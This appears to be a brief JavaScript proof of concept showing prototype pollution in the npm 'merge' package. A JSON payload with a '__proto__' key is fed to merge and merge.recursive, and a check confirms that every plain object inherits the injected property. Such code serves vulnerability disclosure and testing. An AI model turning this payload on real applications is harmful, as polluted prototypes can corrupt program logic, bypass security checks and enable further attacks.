let merge = require("merge");
let BAD_JSON = JSON.parse('{"__proto__":{"test":123}}');

merge.recursive({}, BAD_JSON);
console.log("merge.recursive vuln?", {}.test); // true

merge.recursive(BAD_JSON);
console.log("merge.recursive vuln?", {}.test); // true

merge(BAD_JSON);
console.log("merge vuln?", {}.test); // true